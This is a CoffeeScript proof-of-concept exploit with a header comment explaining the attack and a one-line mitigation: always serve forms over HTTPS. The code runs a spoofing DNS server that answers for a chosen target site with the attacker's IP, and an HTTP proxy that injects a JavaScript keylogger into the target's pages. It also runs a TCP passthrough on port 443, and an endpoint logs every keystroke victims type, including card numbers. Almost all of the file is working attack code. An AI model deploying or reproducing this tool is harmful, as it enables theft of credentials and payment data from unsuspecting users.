
###

This is a proof-of-concept exploit for gathering sensitive information
in situations where the sensitive information is transmitted over HTTPS
but application code is transmitted over HTTP. By injecting a JavaScript
keylogger into the HTML, we can send keystrokes back to our server
before the sensitive data is even sent over HTTPS.

The solution here is simple (and already a security best-practice): any
form that takes secure data should ALWAYS be served over HTTPS.

This program runs three servers: an HTTP proxy, a DNS server, and a TCP
proxy.

The attack works as follows:

The attacker configures the environment by setting the environment
variable PUBLIC_IP to the IP of her server, TAP_HOST to the vulnerable
site, and UPSTREAM_DNS to the IP of regular DNS server.

The attacker runs this script on a publically accessible server. The
attacker then overrides the DNS settings on a router to the IP of the
server.

When a user accesses the site at TAP_HOST in his browser, his computer
makes a DNS request which hits the attacker's DNS server. The DNS
server sees that the request is for TAP_HOST, and so responds with
its own IP (PUBLIC_IP). The browser then connects to PUBLIC_IP
and requests a particular page. The attacker's server forwards this
request to the actual TAP_HOST, injects keylogger code into the
response, and sends it back to the victim's browser.

The keylogger code sets up a listener on the page to the keypress
event, and makes an Ajax request to the server on each keystroke.
The server records the keystrokes to the terminal, and thus anything
the user types, including his credit card, is comprimised.

###

httpProxy = require 'http-proxy'
dns = require 'native-dns'
net = require 'net'
qs = require 'querystring'
fs = require 'fs'

# keylog.html is the keylogger code which will be injected into the page
keylog = fs.readFileSync 'keylog.html'

HTTP_PORT = 80
HTTPS_PORT = 443
DNS_PORT = 53
DNS_TIMEOUT = 1000
DNS_TTL = 60

# Load configuration from environment variables

ENV_VARS =
  PUBLIC_IP:    'The public IP of this server'
  TAP_HOST:     'The hostname of the site for which you want to tap keystrokes'
  UPSTREAM_DNS: 'A DNS server to use for non-tapped hostnames'

for param, desc of ENV_VARS
  if not process.env[param]
    console.log "The environment variable #{param} (#{desc}) must be set."
    process.exit()
  else
    console.log "#{param} = #{process.env[param]}"

# HTTP proxy server (with keylogger injection)

server = httpProxy.createServer (req, res, proxy) ->
  if /^\/keylog/.exec(req.url)
    # The keylogger code makes Ajax requests to
    # http://(TAP_HOST)/keylog. The requests are
    # processed and logged to the console here.
    qstring = /\?(.*)/.exec(req.url)?[1]
    {key} = qs.parse(qstring)
    # Replace tab and enter keystrokes with the newline
    # character
    key = key.replace '\r', '\n'
    key = key.replace '\t', '\n'
    process.stdout.write key
    res.writeHead(200)
    res.end('ok')
    return

  # There are a number of places where we replace methods on
  # objects at the instance level. The convention used here is
  # to store the old method on the object with the prefix "old"
  res.oldWriteHead = res.writeHead
  res.writeHead = (code, headers) ->
    if /text\/html/.exec(headers['content-type'])
      # We only attempt to inject into responses with
      # content-type of text/html. 
      console.log "Injecting page #{req.headers['host']}#{req.url}"
      
      # Drop the Content-Length header since we'll be changing the
      # content
      delete headers['content-length']

      # buffer the response until it is complete, so we can inject
      # it with the keylogger
      data = ''
      res.oldWrite = res.write
      res.write = (chunk) ->
        data += chunk

      res.oldEnd = res.end
      res.end = ->
        # We want to inject the keylogger into the <head> element
        # without clashing with <meta http-equiv> tags, so we insert
        # it after the title closing tag.
        data = data.replace('</title>', "</title>#{keylog}")
        res.oldWrite(data)
        res.oldEnd()

    res.oldWriteHead code, headers

  # Request plain, unencoded response so we don't have to do any
  # decoding to do the injection
  req.headers['accept-encoding'] = 'plain'
  if req.headers['host']?
    proxy.proxyRequest req, res,
      host: req.headers['host']
      port: HTTP_PORT
  else
    # ignore requests that don't have a Host header
    res.end()

server.listen HTTP_PORT, ->
  console.log "HTTP Proxy listening on port #{HTTP_PORT}"

# DNS Proxy Server

dnsServer = dns.createServer()

dnsServer.on 'request', (req, res) ->
  if req.question[0].name == process.env.TAP_HOST
    # If the name requested is TAP_HOST, respond with an A record
    # containing the IP given in PUBLIC_IP, ie. the IP of this
    # server
    console.log "Intercepting DNS request for #{process.env.TAP_HOST}"
    res.answer.push dns.A
      name: req.question[0].name
      address: process.env.PUBLIC_IP
      ttl: DNS_TTL
    res.send()
  else
    # For all other names, proxy the request to an upstream DNS
    # server supplied in UPSTREAM_DNS. Forward the response
    # unmodified
    newReq = dns.Request
      server:
        address: process.env.UPSTREAM_DNS
        port: DNS_PORT
      question: dns.Question(req.question[0])
      timeout: DNS_TIMEOUT
    newReq.on 'message', (err, answer) ->
      res.answer = res.answer.concat(answer.answer)
    newReq.on 'end', ->
      res.send()
    newReq.send()

dnsServer.serve DNS_PORT

# TCP Proxy Server running on port 443 (HTTPS)
# Forwards requests unmodified (since we can't modify the
# contents of an encrypted packet).
# This is not strictly part of the attack, but generalizes
# the attack by allowing https://TAP_HOST to work as normal.
# Based on https://github.com/gonzalo123/nodejs.tcp.proxy

tcpProxy = net.createServer (socket) ->
  upstream = new net.Socket()
  upstream.connect(HTTPS_PORT, process.env.TAP_HOST)
  
  socket.on 'data', (data) ->
    upstream.write data

  upstream.on 'data', (data) ->
    socket.write data

tcpProxy.listen HTTPS_PORT, ->
  console.log "TCP Proxy listening on port #{HTTPS_PORT}"

